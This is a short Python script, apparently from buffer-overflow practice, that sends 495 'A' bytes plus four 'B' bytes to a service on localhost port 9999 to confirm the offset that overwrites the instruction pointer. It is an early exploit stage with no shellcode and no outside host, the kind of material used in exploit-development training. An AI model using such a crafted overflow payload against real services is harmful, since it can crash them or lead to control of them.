import socket
import time
import sys

offset = 495
buffer = b"A" * offset + b"B" * 4
target = '127.0.0.1'
port = 9999

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((target, port))
s.send((b"                          >> " + buffer))
s.close()